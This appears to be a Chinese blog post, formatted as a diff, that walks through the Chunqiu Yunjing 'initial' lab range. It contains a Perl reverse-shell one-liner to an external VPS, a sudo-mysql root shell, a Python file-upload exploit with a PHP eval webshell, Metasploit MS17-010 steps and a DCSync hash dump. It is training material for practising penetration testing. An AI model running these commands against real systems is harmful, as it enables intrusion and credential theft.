@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜-initial | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="我们来展示一下实战攻防的场景（未授权攻击他人服务器是违法行为,请勿模仿) 获取靶机（可以理解为一家公司的四台电脑）中的三份重要文件，可以理解类似商业机密的文件 信息收集 使用fscan，综合漏洞扫描、信息收集的工具进行收集主机的信息，扩展攻击面 1fscan.exe -h 39.99.154.105   扫出thinkphp的rce 使用开发好的漏洞利用工具直接利用 使用一把梭直接梭   连接成功">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-initial">
+<meta property="og:url" content="https://hundredsu.github.io/post/fdc2faba.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="我们来展示一下实战攻防的场景（未授权攻击他人服务器是违法行为,请勿模仿) 获取靶机（可以理解为一家公司的四台电脑）中的三份重要文件，可以理解类似商业机密的文件 信息收集 使用fscan，综合漏洞扫描、信息收集的工具进行收集主机的信息，扩展攻击面 1fscan.exe -h 39.99.154.105   扫出thinkphp的rce 使用开发好的漏洞利用工具直接利用 使用一把梭直接梭   连接成功">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T08:50:20.000Z">
+<meta property="article:modified_time" content="2025-08-07T17:49:28.630Z">
+<meta property="article:author" content="Hundredsu">
+<meta property="article:tag" content="靶机渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-initial",
+  "url": "https://hundredsu.github.io/post/fdc2faba.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T08:50:20.000Z",
+  "dateModified": "2025-08-07T17:49:28.630Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/fdc2faba.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜-initial',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">春秋云镜-initial</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜-initial</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T08:50:20.000Z" title="发表于 2025-08-07 16:50:20">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T17:49:28.630Z" title="更新于 2025-08-08 01:49:28">2025-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>我们来展示一下实战攻防的场景（未授权攻击他人服务器是违法行为,请勿模仿)</p>
+<p>获取靶机（可以理解为一家公司的四台电脑）中的三份重要文件，可以理解类似商业机密的文件</p>
+<p>信息收集</p>
+<p>使用fscan，综合漏洞扫描、信息收集的工具进行收集主机的信息，扩展攻击面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.99.154.105</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/1.png"></p>
+<p>扫出thinkphp的rce</p>
+<p>使用开发好的漏洞利用工具直接利用</p>
+<p>使用一把梭直接梭</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/2.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/3.png"></p>
+<p>连接成功</p>
+<p>执行whoami、ifconfig收集内网信息</p>
+<p>内网网段为172.22.1.0&#x2F;24</p>
+<p>发现只是普通用户</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/4.png"></p>
+<p>那就需要提权了</p>
+<p>同时这台还是linux</p>
+<p>内核容易崩，我们就先考虑suid和sudo提权</p>
+<p>我们现在只是普通用户 需要提权到root</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/5.png"></p>
+<p>mysql的sudo可以提权</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>在这个网站查询一下</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/6.png"></p>
+<p>使用以下的命令即可提权，或者是以root用户来执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#获取交互式shell</span><br><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">#以root权限执行whoami命令（哥斯拉并不是交互式）</span><br><span class="line">sudo mysql -e &#x27;\! whoami&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/7.png"></p>
+<p>攻击成功获取到对面的重要文件即flag01</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/8.png"></p>
+<p>使用大文件上传fscan，综合扫描工具</p>
+<p>还有<strong>Stowaway–隧道工具的客户端</strong></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/9.png"></p>
+<p>这里我直接使用哥斯拉和蚁剑执行fscan进行二次收集一直不成功（这也是在我们真实攻防中经常发生的事，所以我们需要掌握多种攻击手法和多种防御手法）</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/10.png"></p>
+<p>那我们先建立网络隧道，使得我的电脑可以直接与该服务器的内网进行网络通讯</p>
+<p>这里我使用的是Stowaway</p>
+<p>其还可以获取shell，同时还可以通过反弹shell使我在我的vps上可以获取交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1080      #服务端（vps）</span><br><span class="line">./linux_x64_agent -c 47.113.229.136:1080   #客户端（靶机）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>vps</p>
+<p>先在vps上监听</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/11.png"></p>
+<p>靶机</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/12.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/13.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#连接后选择39.99.154.105这台机器</span><br><span class="line">use 0</span><br><span class="line">#将vps作为跳板机，在1123端口上开启socks隧道</span><br><span class="line">socks 1123</span><br><span class="line"></span><br><span class="line">#获取shell，即命令行</span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line">#编辑代理配置文件</span><br><span class="line">vim /etc/proxychains4.conf </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在windows和linux上都配置好代理，使得我们的物理机就是我们自己的电脑可以直接和这个服务器的内网的其他电脑进行通讯</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/14.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/15.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/16.png"></p>
+<p>反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#vps再开一个窗口监听</span><br><span class="line">nc lvvp 1133</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#靶机反弹shell命令</span><br><span class="line">perl -e&#x27;use Socket;$i=&quot;47.113.229.136&quot;;$p=1133;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">#提权</span><br><span class="line">sudo mysql -e &#x27;\! /bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/17.png"></p>
+<p>由于前面已经给了fscan的执行权限，这里直接执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./fscan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./fscan -h 172.22.1.0/24</span><br></pre></td></tr></table></figure>
+
+
+
+<p>对内网进行信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.2</span><br><span class="line">主机名: DC01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.2</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.21</span><br><span class="line">主机名: XIAORANG-WIN7</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.21</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.18</span><br><span class="line">主机名: XIAORANG-OA01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.18</span><br><span class="line">[2025-04-02 18:08:54] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login</span><br><span class="line">[2025-04-02 18:08:54] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010</span><br><span class="line">[2025-04-02 18:08:55] [SUCCESS] 目标: http://172.22.1.15:80</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息:</span><br><span class="line">	links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.15 thinkphprce 已经拿下 </span><br><span class="line">172.22.1.21 XIAORANG-WIN7.xiaorang.lab MS17-010 </span><br><span class="line">172.22.1.2 DC01 </span><br><span class="line">172.22.1.18 XIAORANG-OA01 信呼协同办公系统</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/18.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/19.png"></p>
+<p>弱口令也可以直接登陆成功</p>
+<p>admin</p>
+<p>admin123</p>
+<p>直接搜索信呼协同办公系统有没有历史漏洞</p>
+<p>这里找到一个poc</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-qcloudCosAction.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md">https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-qcloudCosAction.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md</a></p>
+<p>前面挂载好代理了</p>
+<p>修改一下exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>一句话木马</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>($_POST[<span class="string">&quot;1&quot;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因为建立好代理了，所以我们可以直接使用物理机对其内网进行攻击，上传木马</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/20.png"></p>
+<p>使用蚁剑连接</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/21.png"></p>
+<p>连接发现直接就是system权限，也就是拿下第二台主机</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/22.png"></p>
+<p>找到第二个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.15 thinkphprce 已经拿下 </span><br><span class="line">172.22.1.21 XIAORANG-WIN7.xiaorang.lab MS17-010 </span><br><span class="line">172.22.1.2 DC01 </span><br><span class="line">172.22.1.18 XIAORANG-OA01 信呼协同办公系统   已经拿下</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在就剩域控DC01和172.22.1.21这两台没有拿下了</p>
+<p>fscan探测出172.22.1.21有ms17-010，经典的永恒之蓝的漏洞</p>
+<p>我们使用kali中的msf直接打</p>
+<p>使用代理打开 这样待会的rhost就可以直接填写内网地址了，就不需要再在里面配置代理了</p>
+<p>set proxies <font style="color:rgb(230, 192, 123);">set</font> proxies socks5:xx.xx.xx.xx:xxxx</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/23.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/24.png"></p>
+<p>稍等一会 攻击成功 shell回来了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502	krbtgt	fb812eea13a18b7fcdb8e6d67ddc205b	514</span><br><span class="line">1106	Marcus	e07510a4284b3c97c8e7dee970918c5c	512</span><br><span class="line">1107	Charles	f6a9881cd5ae709abb4ac9ab87f24617	512</span><br><span class="line">1000	DC01$	87628a76c2de25114bb8942b7e25753c	532480</span><br><span class="line">500	Administrator	10cf89a850fb1cdbe6bb432b859164c8	512</span><br><span class="line">1104	XIAORANG-OA01$	2fbe83b054261d4b6f4c080e1e012974	4096</span><br><span class="line">1108	XIAORANG-WIN7$	e0c789db6b3e4df88dfdb763ad7f75f6	4096</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在进行PTH(pass the hash)攻击</p>
+<p>使用现成的脚本进行攻击</p>
